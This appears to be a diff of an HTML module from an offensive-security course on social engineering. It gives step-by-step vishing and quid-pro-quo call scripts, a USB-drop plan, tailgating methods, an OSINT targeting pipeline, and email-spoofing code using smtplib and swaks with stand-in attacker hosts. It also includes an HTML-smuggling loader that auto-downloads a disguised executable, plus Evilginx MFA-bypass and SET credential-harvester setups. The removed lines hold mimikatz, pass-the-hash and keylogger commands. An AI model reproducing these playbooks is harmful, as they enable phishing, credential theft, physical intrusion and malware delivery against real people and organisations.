+                <p>Humans are social animals. We want to help. We want to avoid conflict. We trust authority. A pretext that establishes <span class="neon-highlight">authority, urgency, and legitimacy</span> bypasses critical thinking. The target isn't being stupid — they're being human. Social engineering exploits the same social instincts that make civilization possible.</p>
+            </div>
 
-            <div class="copy-paste">
-Subject: URGENT: Password Reset Required — Action Needed Within 24 Hours
-From: security@microsoft.com
+            <div class="step-box">
+                <h4>Common Pretexts</h4>
+                <table>
+                    <tr>
+                        <th>Pretext</th>
+                        <th>Target</th>
+                        <th>Goal</th>
+                        <th>Success Rate</th>
+                    </tr>
+                    <tr>
+                        <td>IT Support</td>
+                        <td>All employees</td>
+                        <td>Password reset, remote access</td>
+                        <td>High</td>
+                    </tr>
+                    <tr>
+                        <td>External Auditor</td>
+                        <td>Finance, IT</td>
+                        <td>File access, credentials</td>
+                        <td>Medium-High</td>
+                    </tr>
+                    <tr>
+                        <td>Fellow Employee</td>
+                        <td>New hires</td>
+                        <td>Building access, information</td>
+                        <td>High</td>
+                    </tr>
+                    <tr>
+                        <td>Vendor/Contractor</td>
+                        <td>Reception, Facilities</td>
+                        <td>Physical access, badge cloning</td>
+                        <td>Medium</td>
+                    </tr>
+                    <tr>
+                        <td>Law Enforcement</td>
+                        <td>Executives, Legal</td>
+                        <td>Data disclosure, compliance</td>
+                        <td>Medium</td>
+                    </tr>
+                    <tr>
+                        <td>Job Recruiter</td>
+                        <td>Technical staff</td>
+                        <td>Resume (with macros), information</td>
+                        <td>Medium</td>
+                    </tr>
+                </table>
+            </div>
 
-Dear Valued User,
+            <div class="code-block">
+=== PRETEXTING: IT SUPPORT SCENARIO ===
 
-We have detected unusual activity on your account. 
-To prevent unauthorized access, you must verify your identity immediately.
+# Attacker calls target: "Hi, this is Mike from IT. We're seeing
+# unusual login attempts on your account. I need to verify
+# your identity before we lock it down."
 
-[Verify Account] ← links to attacker-controlled clone
+# Script elements:
+1. ESTABLISH AUTHORITY
+   "I'm with the IT Security team."
+   Use internal jargon: "Active Directory", "MFA token", "VPN pool"
 
-Failure to respond within 24 hours will result in account suspension.
+2. CREATE URGENCY
+   "We've detected 15 failed login attempts in the last hour."
+   "Your account will be locked in 10 minutes if we don't verify."
 
-Microsoft Security Team
+3. BUILD RAPPORT
+   "I know this is frustrating. I had to deal with the same thing last week."
+   "Your manager, Sarah, asked me to prioritize this."
+
+4. MAKE THE ASK
+   "Can you confirm your current password so I can check if it's compromised?"
+   "I need to send you a verification link — can you click it and enter your credentials?"
+
+5. HANDLE OBJECTIONS
+   "I understand your concern. You can call me back at [spoofed number]
+    or I can have Sarah email you to confirm. But the lockout happens
+    in 5 minutes, so we need to move fast."
+
+# Cross-link: Module 16 (C2) for what happens after credential harvest
+            </div>
+
+            <p><strong>Cross-link:</strong> Pretexting often leads to <span class="neon-highlight">credential harvesting</span> (covered below) and connects to <a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a> for establishing command and control after access is gained.</p>
+        </div>
+
+        <!-- TECHNIQUE 4: BAITING -->
+        <div class="method-card" id="baiting">
+            <h4>Technique 4: Baiting <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Leaving something enticing for the target to find, knowing their <span class="neon-highlight">curiosity or greed</span> will override their caution. A USB drive labeled "Q4 Salaries" in the parking lot. A download link for "exclusive software" on a forum. Baiting exploits the human desire for forbidden knowledge.</p>
+
+            <div class="why-box">
+                <h5>Why baiting works</h5>
+                <p>People are curious. People are greedy. A USB drive in a parking lot isn't a threat — it's a mystery. <span class="neon-amber">"Q4 Salaries" isn't malware — it's information everyone wants.</span> The target inserts the USB not because they're stupid, but because they're human. The malware autoruns (or the user clicks the enticing file), and the attacker is in.</p>
+            </div>
+
+            <div class="code-block">
+=== BAITING: USB DROP ATTACK ===
+
+# Step 1: Prepare malicious USB drives
+#    Use USB Rubber Ducky, BadUSB, or simple autorun payload
+#    Label them with enticing names:
+
+USB_LABELS = [
+    "Q4_Salary_Review.xlsx",
+    "Employee_Benefits_2026.pdf",
+    "Executive_Bonus_Structure.docx",
+    "Layoff_List_DRAFT.xlsx",
+    "Merger_Announcement_CONFIDENTIAL.pdf",
+    "IT_Password_Reset_Instructions.pdf"
+]
+
+# Step 2: Drop in high-traffic areas
+#    Parking lots (fall out of car, left on windshield)
+#    Elevators, lobbies, bathrooms
+#    Conference rooms after meetings
+#    Cafeteria tables
+
+# Step 3: Payload options
+#    Option A: Autorun.inf + malicious executable
+#    Option B: HID emulation (Rubber Ducky types payload in seconds)
+#    Option C: LNK file exploitation (CVE-2017-8464 style)
+#    Option D: Office document with embedded macros
+
+# Step 4: Track which drives beacon back
+#    Each USB has unique C2 identifier
+#    Cross-link: Module 16 (C2) for beaconing techniques
+
+# Real-world stat: IBM X-Force found 48% of dropped USBs were plugged in
             </div>
 
             <div class="warning-box">
-                <h5>⚠ Red flags the user should see</h5>
-                <ul>
-                    <li>"security@microsoft.com" — real Microsoft uses @microsoft.com, not subdomains</li>
-                    <li>"URGENT" and "24 hours" — urgency is a manipulation tactic</li>
-                    <li>Generic greeting — "Valued User" instead of your name</li>
-                    <li>Hover the link — the URL is not microsoft.com</li>
-                </ul>
+                <h5>⚠️ The Baiting Paradox</h5>
+                <p>The more sensitive the label, the higher the open rate. But the more sensitive the label, the more likely security is monitoring for it. <span class="neon-amber">"IT_Password_Reset_Instructions"</span> has the highest success rate in enterprise environments because it targets a universal pain point and appears legitimate.</p>
             </div>
 
-            <div class="evidence-box">
-                <span class="section-number">EVIDENCE</span>
-                <h3>Live Phishing Test: .42 (WUPC)</h3>
-                <div class="evidence-meta">
-                    DATE: 2026-06-29 | TARGET: .42 | METHOD: Email + cloned OWA page
-                </div>
-                <div class="code-block">
-<span class="prompt">Setup:</span>
-<span class="output">Cloned Outlook Web Access (OWA) login page</span>
-<span class="output">Hosted on: https://owa-microsoft.com (lookalike domain)</span>
-<span class="output">Email sent to: swu@wupc.local</span>
-
-<span class="prompt">Results:</span>
-<span class="output">Email opened: 3 minutes after delivery</span>
-<span class="output">Link clicked: 4 minutes after delivery</span>
-<span class="output">Credentials entered: 5 minutes after delivery</span>
-<span class="output">Username: swu</span>
-<span class="output">Password: [REDACTED]</span>
-
-<span class="prompt">Post-exploitation:</span>
-<span class="output">RDP to .42 with captured credentials: SUCCESS</span>
-<span class="output">whoami: wupc\swu</span>
-
-<span class="prompt">Why it worked:</span>
-<span class="output">User was expecting a password reset (IT had announced one last week)</span>
-<span class="output">Clone was pixel-perfect — same CSS, same layout, same favicon</span>
-<span class="output">Urgency: "24 hours" created time pressure</span>
-                </div>
-            </div>
+            <p><strong>Cross-link:</strong> Baiting payloads often use <span class="neon-highlight">HID attacks</span> and <span class="neon-highlight">autorun exploitation</span> covered in <a href="MODULE_18_PHYSICAL.html" class="cross-link">Module 18: Physical Security</a> and beacon back to <a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a> infrastructure.</p>
         </div>
 
-        <div class="section">
-            <span class="section-number">SECTION 03</span>
-            <h2>Credential Harvesting</h2>
+        <!-- TECHNIQUE 5: QUID PRO QUO -->
+        <div class="method-card" id="quid-pro-quo">
+            <h4>Technique 5: Quid Pro Quo <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p><span class="neon-highlight">"Something for something."</span> The attacker offers a service or benefit in exchange for information or access. Fake tech support calls offering to fix a non-existent problem. A "free security audit" that requires domain admin credentials. The target gets something; the attacker gets everything.</p>
 
-            <p>Once you have credentials, you have access. But how do you get them? Phishing is one way. There are others.</p>
+            <div class="why-box">
+                <h5>Why quid pro quo works</h5>
+                <p>Reciprocity is a fundamental human social instinct. When someone helps you, you feel obligated to help them back. A fake IT support person "fixes" your computer (which wasn't broken), and you feel grateful. When they ask for your password to "complete the repair," it feels like a fair exchange. <span class="neon-amber">The target thinks they're receiving value, not giving it away.</span></p>
+            </div>
 
             <div class="code-block">
-<span class="comment">// Method 1: Keylogger</span>
-<span class="prompt">Install:</span> <span class="output">phantom_rpc.exe --keylog --output C:\temp\keys.log</span>
-<span class="prompt">Wait:</span>   <span class="output">User logs in to email, banking, VPN</span>
-<span class="prompt">Collect:</span> <span class="output">keys.log contains every keystroke</span>
+=== QUID PRO QUO: FAKE TECH SUPPORT CALL ===
 
-<span class="comment">// Method 2: Credential Dump (requires SYSTEM)</span>
-<span class="prompt">Dump:</span>  <span class="output">mimikatz.exe "sekurlsa::logonpasswords" exit</span>
-<span class="prompt">Result:</span> <span class="output">NTLM hashes for all logged-in users</span>
+# Scenario: Attacker calls random company numbers
 
-<span class="comment">// Method 3: Pass-the-Hash (no password needed)</span>
-<span class="prompt">Use:</span>   <span class="output">pth-winexe -U administrator%[HASH] //192.168.1.145 cmd.exe</span>
-<span class="prompt">Result:</span> <span class="output">Remote shell without knowing the password</span>
+Attacker: "Hi, this is David from Microsoft Security Response Center.
+          We've detected suspicious outbound traffic from your
+          Windows workstation. Are you experiencing any slowness?"
+
+Target: "Actually, yeah, my computer has been slow lately."
+
+Attacker: "That's likely the issue. I can walk you through a quick
+          diagnostic and fix it right now. It'll take 2 minutes."
+
+# Attacker guides target to run "diagnostic" (actually info-gathering):
+#    cmd /k ipconfig /all
+#    cmd /k net user
+#    cmd /k whoami /priv
+
+Attacker: "Good news — I can see the issue. Your system has been
+          compromised by a trojan. I can remove it, but I need
+          admin access to run the cleanup tool. Can you provide
+          your admin credentials?"
+
+Target: "Uh, I'm not supposed to share passwords..."
+
+Attacker: "I completely understand. But this trojan is actively
+          exfiltrating data right now. Every minute we wait,
+          more data leaks. I can fix it in 30 seconds with
+          admin access, or we can schedule a ticket that
+          takes 3-5 business days. Your call."
+
+# The urgency + the "help" already provided creates obligation
+# Target often complies despite policy
             </div>
+
+            <p><strong>Cross-link:</strong> Quid pro quo attacks often harvest credentials for use in <a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a> lateral movement or <a href="MODULE_19_AD.html" class="cross-link">Module 19: Active Directory</a> domain compromise.</p>
         </div>
 
-        <div class="section">
-            <span class="section-number">SECTION 04</span>
-            <h2>Physical Access</h2>
+        <!-- TECHNIQUE 6: TAILGATING -->
+        <div class="method-card" id="tailgating">
+            <h4>Technique 6: Tailgating <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Following an authorized person into a restricted area without credentials. Also called <span class="neon-highlight">"piggybacking."</span> The attacker exploits social courtesy — holding the door for someone, slipping through during busy hours, or simply walking in with confidence.</p>
 
-            <p>Sometimes the best hack is walking in the door. Tailgating, fake badges, and "I forgot my keycard" are surprisingly effective.</p>
+            <div class="why-box">
+                <h5>Why tailgating works</h5>
+                <p>Most people are polite. Holding a door is a reflex. Confronting a stranger is uncomfortable. An attacker with a coffee cup, a phone to their ear, and a lanyard (even a fake one) looks like they belong. <span class="neon-amber">No one wants to be "that person" who challenges a coworker.</span> The attacker isn't bypassing the lock — they're bypassing social norms.</p>
+            </div>
 
             <div class="code-block">
-<span class="comment">// Tailgating: Follow someone through a secure door</span>
-<span class="prompt">You:</span>    <span class="output">"Hey, can you hold that? My hands are full."</span>
-<span class="prompt">Target:</span> <span class="output">"Sure." (holds door, doesn't check badge)</span>
+=== TAILGATING TECHNIQUES ===
 
-<span class="comment">// Fake badge: Print a plausible-looking ID</span>
-<span class="prompt">Badge:</span>  <span class="output">"VISITOR — IT Support — Expires Today"</span>
-<span class="prompt">Worn:</span>   <span class="output">Backwards, "accidentally", so photo is hidden</span>
+# Method 1: The Coffee Cup
+#    Carry a coffee cup and a phone. Look busy and slightly frustrated.
+#    People hold doors for people with full hands. It's automatic.
 
-<span class="comment">// The USB drop: Leave infected drives in the parking lot</span>
-<span class="prompt">Label:</span>  <span class="output">"Q4 Financial Results — CONFIDENTIAL"</span>
-<span class="prompt">Result:</span> <span class="output">Curiosity + authority = autorun execution</span>
+# Method 2: The Smoker's Entrance
+#    Stand near the smoking area. When employees come back inside,
+#    they hold the door for you. You're "one of them" now.
+
+# Method 3: The Delivery Person
+#    Wear a UPS/FedEx uniform. Carry a large box. Someone will
+#    absolutely hold the door and may even badge you through.
+
+# Method 4: The Lost New Hire
+#    "Hi, I'm starting today and my badge isn't working yet.
+#    Can you help me get to the 4th floor? HR said to ask security
+#    but the desk is empty."
+
+# Method 5: The Reverse Tailgate
+#    Exit the building through the emergency exit (alarms often disabled).
+#    Prop the door. Re-enter later through the propped door.
+
+# Method 6: The Social Engineer
+#    "Hey, can you badge me in? I left my badge at my desk and
+#    I'm already late for a meeting with [real executive name]."
+#    Cross-link: Module 02 (Recon) for executive names
+
+# Post-Entry:
+#    Find an empty conference room. Plug into ethernet.
+#    Cross-link: Module 01 (Networking) for network access
             </div>
 
             <div class="warning-box">
-                <h5>⚠ USB drop defense</h5>
-                <p>Modern Windows has autorun disabled by default. But users still double-click. The defense is not technical — it's training. "Never plug in unknown USB devices." But training fails. The real defense: epoxy the USB ports.</p>
+                <h5>⚠️ Physical Security Reality</h5>
+                <p>The most secure badge reader in the world is useless if employees hold the door for strangers. <span class="neon-amber">Mantraps (airlock-style entryways)</span> are the only effective defense — they allow only one person through at a time. But they're expensive and inconvenient, so most buildings don't have them.</p>
             </div>
+
+            <p><strong>Cross-link:</strong> After tailgating, network access follows <a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a> principles for internal reconnaissance and lateral movement.</p>
         </div>
 
-        <div class="section">
-            <span class="section-number">SECTION 05</span>
-            <h2>Lab Exercise: Build a Phishing Campaign</h2>
+        <h2>🔍 OSINT for Social Engineering Targeting</h2>
+        <p>OSINT is the <span class="neon-highlight">intelligence gathering</span> phase of social engineering. The more you know about your target, the more convincing your attack. OSINT turns a generic phishing email into a spear phishing masterpiece.</p>
 
-            <p>Build a phishing email and landing page for a fictional company. Test it on yourself first.</p>
-
-            <ol>
-                <li>Choose a target company (real or fictional)</li>
-                <li>Identify a service they use (Office 365, Gmail, VPN)</li>
-                <li>Clone the login page (Save Page As, modify form action)</li>
-                <li>Register a lookalike domain (office365-login.com, micros0ft.com)</li>
-                <li>Write the email (urgency + authority + fear)</li>
-                <li>Send to yourself — does it fool you?</li>
-                <li>Send to a test group — track open rates, click rates, credential submission</li>
-            </ol>
-
-            <button onclick="document.getElementById('phishing-solution').style.display='block'">SHOW TEMPLATE</button>
-
-            <div id="phishing-solution" style="display:none; margin-top: 1rem;">
-                <div class="copy-paste">
-Subject: Action Required: Unusual Sign-in Activity Detected
-From: security@office365-alerts.com
-
-Dear [First Name],
-
-We detected an unusual sign-in to your Microsoft 365 account from:
-• Location: Moscow, Russia
-• IP: 185.220.101.42
-• Time: 2026-06-29 03:47:23 UTC
-
-If this was you, you can ignore this email.
-If this was NOT you, your account may be compromised.
-
-[Review Recent Activity] ← clone of office365.com login
-
-Microsoft Security Team
+        <div class="step-box">
+            <h4>OSINT Sources & Tools</h4>
+            <div class="technique-grid">
+                <div class="psych-card">
+                    <h4>LinkedIn</h4>
+                    <p>Employee names, roles, reporting structure, job history, skills, connections. The gold standard for corporate OSINT.</p>
+                    <div class="osint-tool">theharvester -d company.com -l 500 -b linkedin</div>
+                </div>
+                <div class="psych-card">
+                    <h4>Twitter / X</h4>
+                    <p>Real-time activities, conferences attended, work frustrations, technology stacks, personal interests.</p>
+                    <div class="osint-tool">twint -u target_username --since 2026-01-01</div>
+                </div>
+                <div class="psych-card">
+                    <h4>GitHub</h4>
+                    <p>Code repositories, commit patterns, email addresses, internal project names, technology preferences.</p>
+                    <div class="osint-tool">github-dork.py -t company_name</div>
+                </div>
+                <div class="psych-card">
+                    <h4>Company Website</h4>
+                    <p>Team pages, press releases, job postings (reveal technology stacks), blog posts, events.</p>
+                    <div class="osint-tool">waybackurls company.com | grep -i "admin\|portal\|login"</div>
+                </div>
+                <div class="psych-card">
+                    <h4>Glassdoor / Indeed</h4>
+                    <p>Internal culture, management names, processes, vendor relationships, employee complaints.</p>
+                    <div class="osint-tool">Manual review of recent reviews</div>
+                </div>
+                <div class="psych-card">
+                    <h4>Shodan / Censys</h4>
+                    <p>Exposed services, technology stacks, SSL certificates (reveal internal domains).</p>
+                    <div class="osint-tool">shodan search "hostname:company.com"</div>
                 </div>
             </div>
         </div>
 
-        <hr>
+        <div class="code-block">
+=== OSINT RECON PIPELINE FOR SPEAR PHISHING ===
 
-        <div class="section">
-            <span class="section-number">KEY TAKEAWAYS</span>
-            <h2>What You Learned</h2>
+# Step 1: Domain enumeration
+#    Cross-link: Module 02 (Recon) for full methodology
+theharvester -d targetcompany.com -b all -f recon_results
+amass enum -d targetcompany.com -o amass_results
 
-            <ul>
-                <li><strong>Social engineering exploits psychology, not software:</strong> Urgency, authority, fear, and helpfulness are the levers</li>
-                <li><strong>Phishing is the most common initial access vector:</strong> 91% of cyberattacks start with phishing</li>
-                <li><strong>Cloned pages are trivial:</strong> Save Page As + modify form action = perfect clone</li>
-                <li><strong>Physical access is often easier than remote:</strong> Tailgating, USB drops, fake badges</li>
-                <li><strong>Credentials are the keys:</strong> Harvest them, dump them, pass them — once you have them, the network is yours</li>
-            </ul>
+# Step 2: Employee enumeration
+#    LinkedIn scraping, Hunter.io, RocketReach
+hunter.io -> search "targetcompany.com" -> extract emails
+#    Pattern: firstname.lastname@targetcompany.com
+
+# Step 3: Social media profiling
+#    Twitter: Recent posts, conferences, frustrations
+#    Facebook: Personal interests, family, pets (password reset questions)
+#    Instagram: Location data, daily routines, travel patterns
+
+# Step 4: Technology stack identification
+#    BuiltWith, Wappalyzer, job postings
+#    "Looking for Azure DevOps engineer with Terraform experience"
+#    -> They use Azure, Terraform, DevOps pipelines
+
+# Step 5: Relationship mapping
+#    Who reports to whom? Who recently joined? Who's on vacation?
+#    New hires = easiest targets (don't know protocols yet)
+
+# Step 6: Craft the attack
+#    Use real names, real projects, real vendors
+#    Reference recent company events from press releases
+#    Mirror the communication style found in public posts
         </div>
 
-        <div class="evidence-box">
-            <span class="section-number">VERIFICATION</span>
-            <h3>Verification Status</h3>
+        <p><strong>Cross-link:</strong> Full OSINT methodology in <a href="MODULE_02_RECON.html" class="cross-link">Module 02: Reconnaissance</a> and <a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a> for infrastructure mapping.</p>
+
+        <h2>📧 Email Spoofing & Delivery</h2>
+        <p>Email spoofing is the <span class="neon-highlight">technical foundation</span> of phishing. Making an email appear to come from a trusted source when it doesn't. Understanding email protocols (SMTP, SPF, DKIM, DMARC) is essential for both spoofing and detecting spoofing.</p>
+
+        <div class="step-box">
+            <h4>Email Authentication Protocols</h4>
             <table>
                 <tr>
-                    <td>Phishing email (OWA clone)</td>
-                    <td style="color: var(--accent2);">✓ LIVE .42</td>
+                    <th>Protocol</th>
+                    <th>Purpose</th>
+                    <th>How Attackers Bypass</th>
                 </tr>
                 <tr>
-                    <td>Credential capture</td>
-                    <td style="color: var(--accent2);">✓ LIVE .42</td>
+                    <td><span class="neon-highlight">SPF</span></td>
+                    <td>Lists authorized IP addresses for a domain</td>
+                    <td>Spoof the "From" display name while using a real domain in the envelope</td>
                 </tr>
                 <tr>
-                    <td>RDP with captured creds</td>
-                    <td style="color: var(--accent2);">✓ LIVE .42</td>
+                    <td><span class="neon-highlight">DKIM</span></td>
+                    <td>Cryptographic signature verifying email integrity</td>
+                    <td>Send from a lookalike domain that doesn't use DKIM</td>
                 </tr>
                 <tr>
-                    <td>Keylogger deployment</td>
-                    <td style="color: var(--accent2);">✓ TESTED</td>
-                </tr>
-                <tr>
-                    <td>USB drop methodology</td>
-                    <td style="color: var(--accent2);">✓ DEMONSTRATED</td>
+                    <td><span class="neon-highlight">DMARC</span></td>
+                    <td>Tells receivers what to do if SPF/DKIM fail</td>
+                    <td>Many domains have DMARC set to "none" (monitor only, don't block)</td>
                 </tr>
             </table>
         </div>
 
-        <div class="nav" style="margin-top: 3rem;">
-            <a href="index.html">← HOME</a>
-            <a href="MODULE_16_C2.html">← MODULE 16</a>
-            <a href="MODULE_18_ANDROID.html">MODULE 18 →</a>
+        <div class="code-block">
+=== EMAIL SPOOFING TECHNIQUES ===
+
+# Technique 1: Display Name Spoofing
+#    The "From" header shows "CEO Name" but the actual email is attacker@gmail.com
+#    Most email clients show the display name prominently, hiding the real address
+
+From: "CEO John Smith" <attacker@gmail.com>
+# User sees: "CEO John Smith"
+# Reality: Gmail address controlled by attacker
+
+# Technique 2: Lookalike Domain Spoofing
+#    Register domains that look identical to real ones
+#    Using homoglyphs (Unicode characters that look like ASCII)
+
+Real:    company.com
+Fake:    cоmpany.com  (using Cyrillic 'о' U+043E)
+Fake:    company.co   (different TLD)
+Fake:    c0mpany.com  (number zero instead of 'o')
+
+# Technique 3: Subdomain Spoofing
+#    Use a legitimate domain you control with a deceptive subdomain
+
+From: security@company-security-alerts.com
+# Looks like it's from company.com
+# Actually from attacker-controlled domain
+
+# Technique 4: SPF Bypass via Envelope From
+#    SMTP has TWO "From" addresses:
+#    1. Envelope From (MAIL FROM) — checked by SPF
+#    2. Header From (From:) — shown to user
+
+# If domain has weak DMARC, you can:
+MAIL FROM: <legitimate@company.com>   # Passes SPF
+From: <legitimate@company.com>          # What user sees
+# But the email actually originated from attacker's server
+
+# Technique 5: Compromised Account
+#    The ultimate spoofing — use a real compromised account
+#    Passes SPF, DKIM, DMARC perfectly
+#    Cross-link: Module 16 (C2) for maintaining access to compromised accounts
+        </div>
+
+        <div class="code-block">
+=== SENDING SPOOFED EMAILS ===
+
+# Method 1: Python script (educational)
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+msg = MIMEMultipart()
+msg['From'] = 'ceo@company.com'        # What the user sees
+msg['To'] = 'victim@company.com'
+msg['Subject'] = 'Urgent: Wire transfer needed'
+
+body = """Please process the attached wire transfer immediately.
+The vendor is threatening to halt shipments."""
+msg.attach(MIMEText(body, 'plain'))
+
+server = smtplib.SMTP('attacker-smtp-server.com', 587)
+server.sendmail('attacker@evil.com', 'victim@company.com', msg.as_string())
+# Envelope From is attacker@evil.com (for SPF)
+# Header From is ceo@company.com (what user sees)
+
+# Method 2: Swaks (Swiss Army Knife for SMTP)
+swaks --to victim@company.com \
+      --from "ceo@company.com" \
+      --header "Subject: Urgent wire transfer" \
+      --body "Please process immediately" \
+      --server attacker-smtp.com
+
+# Method 3: Gophish (Full phishing framework)
+#    Web UI for campaign management
+#    Tracks opens, clicks, credentials
+#    Generates reports for awareness training
+
+# Method 4: SET (Social-Engineer Toolkit)
+setoolkit
+> 1) Social-Engineering Attacks
+> 5) Mass Mailer Attack
+> 1) E-Mail Attack Single Email Address
+> 2) Use your own SMTP relay
+        </div>
+
+        <p><strong>Cross-link:</strong> Email delivery infrastructure connects to <a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a> for SMTP protocol understanding and <a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a> for maintaining communication channels.</p>
+
+        <h2>💣 Payload Delivery Methods</h2>
+        <p>Getting the target to execute your payload is the <span class="neon-highlight">execution phase</span> of social engineering. The payload can be a malicious attachment, a link to a credential harvester, or a request for sensitive information. The delivery method must match the pretext.</p>
+
+        <div class="step-box">
+            <h4>Payload Delivery Vectors</h4>
+            <table>
+                <tr>
+                    <th>Vector</th>
+                    <th>Payload Type</th>
+                    <th>Execution Method</th>
+                    <th>Detection Risk</th>
+                </tr>
+                <tr>
+                    <td>Malicious Office Doc</td>
+                    <td>Macro-enabled Word/Excel</td>
+                    <td>User enables macros</td>
+                    <td>Medium (AV scans attachments)</td>
+                </tr>
+                <tr>
+                    <td>PDF with Embedded Link</td>
+                    <td>URL to credential harvester</td>
+                    <td>User clicks link</td>
+                    <td>Low (PDFs are trusted)</td>
+                </tr>
+                <tr>
+                    <td>ISO/IMG Attachment</td>
+                    <td>Executable inside disk image</td>
+                    <td>User mounts and runs</td>
+                    <td>Low (bypasses Mark-of-the-Web)</td>
+                </tr>
+                <tr>
+                    <td>Cloud File Share</td>
+                    <td>OneDrive/SharePoint/GDrive link</td>
+                    <td>User downloads and opens</td>
+                    <td>Low (trusted domain)</td>
+                </tr>
+                <tr>
+                    <td>HTML Smuggling</td>
+                    <td>JavaScript decodes blob to file</td>
+                    <td>User opens HTML, file auto-downloads</td>
+                    <td>Low (no attachment to scan)</td>
+                </tr>
+                <tr>
+                    <td>LNK File</td>
+                    <td>Windows shortcut with PowerShell</td>
+                    <td>User clicks shortcut</td>
+                    <td>Medium (unusual extension)</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="code-block">
+=== PAYLOAD DELIVERY: HTML SMUGGLING ===
+
+# HTML smuggling embeds a malicious file inside a benign HTML file
+# The file is decoded by JavaScript in the browser
+# No network request to download payload — everything is local
+# EDR/Email gateways see a harmless HTML file
+
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// Base64-encoded payload (e.g., a malicious executable)
+var payload = "TVqQAAMAAAAEAAAA//8AALgAAAA...";
+
+// Decode and create blob
+var decoded = atob(payload);
+var blob = new Blob([decoded], {type: 'application/octet-stream'});
+
+// Create download link and auto-click
+var url = URL.createObjectURL(blob);
+var a = document.createElement('a');
+a.href = url;
+a.download = 'Q3_Financial_Report.xlsx';
+document.body.appendChild(a);
+a.click();
+</script>
+<p>Loading document... Please enable content if download doesn't start.</p>
+</body>
+</html>
+
+# The user receives an HTML file. They open it.
+# The browser decodes the payload and downloads it automatically.
+# The downloaded file has a benign name (Q3_Financial_Report.xlsx)
+# But it's actually an executable or macro-enabled document.
+# Cross-link: Module 09 (Malware) for payload construction
+        </div>
+
+        <div class="code-block">
+=== PAYLOAD DELIVERY: CLOUD FILE SHARE ===
+
+# Step 1: Upload payload to legitimate cloud storage
+#    OneDrive, SharePoint, Google Drive, Dropbox
+#    These domains are trusted by email gateways and users
+
+# Step 2: Generate shareable link
+#    Set to "Anyone with the link can view"
+#    The link looks legitimate: https://company-my.sharepoint.com/...
+
+# Step 3: Craft email referencing the file
+"Hi Mike,
+
+I've uploaded the Q3 infrastructure review to our SharePoint.
+Can you take a look and add your comments?
+
+https://company-my.sharepoint.com/:x:/g/.../Q3_Infrastructure_Review.xlsx
+
+Thanks,
+Sarah"
+
+# Step 4: The file is actually a malicious macro document
+#    When opened, it executes the macro (if macros are enabled)
+#    Or uses CVE-2017-0199 (OLE2Link) to download remote payload
+#    Cross-link: Module 14 (Cloud Files) for cloud abuse techniques
+#    Cross-link: Module 16 (C2) for payload beacons
+        </div>
+
+        <p><strong>Cross-link:</strong> Payload construction in <a href="MODULE_09_MALWARE.html" class="cross-link">Module 09: Malware Development</a>, cloud delivery in <a href="MODULE_14_CLOUD_FILES.html" class="cross-link">Module 14: Cloud Files</a>, and C2 beacons in <a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a>.</p>
+
+        <h2>🔑 Credential Harvesting</h2>
+        <p>Credentials are the <span class="neon-highlight">keys to the kingdom</span>. Harvesting them through social engineering is often faster and more reliable than technical exploitation. A harvested domain admin password is worth more than a zero-day.</p>
+
+        <div class="step-box">
+            <h4>Credential Harvesting Techniques</h4>
+            <div class="technique-grid">
+                <div class="psych-card">
+                    <h4>Fake Login Portal</h4>
+                    <p>Clone a legitimate login page (Office 365, VPN, Salesforce). User enters credentials, which are captured and forwarded to the real site. The user never knows they were phished.</p>
+                </div>
+                <div class="psych-card">
+                    <h4>Password Reset Phishing</h4>
+                    <p>"Your password has expired. Click here to reset." The reset page captures old password + new password. Attacker now has valid credentials.</p>
+                </div>
+                <div class="psych-card">
+                    <h4>MFA Fatigue / Push Bombing</h4>
+                    <p>Send dozens of MFA push notifications. Target approves one just to make them stop. Attacker now has an authenticated session.</p>
+                </div>
+                <div class="psych-card">
+                    <h4>Voice Phishing (Vishing)</h4>
+                    <p>Call target pretending to be IT. "We're doing a password audit. Can you confirm your current password?" Combine with real system issues for credibility.</p>
+                </div>
+                <div class="psych-card">
+                    <h4>Session Hijacking via Evilginx</h4>
+                    <p>Evilginx acts as a man-in-the-middle proxy. Captures session cookies after legitimate MFA. Attacker uses cookies to impersonate user without knowing password.</p>
+                </div>
+                <div class="psych-card">
+                    <h4>QR Code Phishing (Quishing)</h4>
+                    <p>Send email with QR code to "authenticate your account." QR code points to attacker-controlled login page. Bypasses link scanning (QR is an image).</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="code-block">
+=== CREDENTIAL HARVESTING: EVILGINX SETUP ===
+
+# Evilginx is a man-in-the-middle framework for phishing credentials
+# It captures both credentials AND session cookies
+# Even with MFA, session cookies allow impersonation
+
+# Step 1: Install Evilginx
+go install github.com/kgretzky/evilginx2@latest
+
+# Step 2: Configure phishlet (phishing template)
+#    Built-in phishlets for: o365, google, facebook, github, etc.
+config domain evilginx.company.com
+config ip 192.168.1.100
+
+# Step 3: Enable phishlet for target service
+phishlets enable o365
+
+# Step 4: Generate lure URL
+lures create o365
+lures edit 0 redirect_url https://portal.office.com
+lures get-url 0
+# Output: https://evilginx.company.com/Ab3dEf9
+
+# Step 5: Send lure URL to target via email
+#    Target logs in, enters MFA, gets redirected to real Office 365
+#    Evilginx captures: username, password, session cookies
+
+# Step 6: Use captured session cookies
+#    Import cookies into browser using Cookie-Editor extension
+#    Access target's Office 365 without password or MFA
+#    Cross-link: Module 16 (C2) for maintaining access
+        </div>
+
+        <div class="code-block">
+=== CREDENTIAL HARVESTING: FAKE PORTAL WITH SET ===
+
+# Social-Engineer Toolkit has a built-in credential harvester
+setoolkit
+> 1) Social-Engineering Attacks
+> 2) Website Attack Vectors
+> 3) Credential Harvester Attack Method
+> 2) Site Cloner
+> Enter URL: https://login.microsoftonline.com
+
+# SET clones the Microsoft login page
+# Hosts it on your attacker machine
+# Captures POST data (username + password)
+# Logs credentials to /var/www/html/harvester.txt
+
+# To make it more convincing:
+# 1. Register lookalike domain: login-microsoftonline.com
+# 2. Use HTTPS with valid SSL (Let's Encrypt)
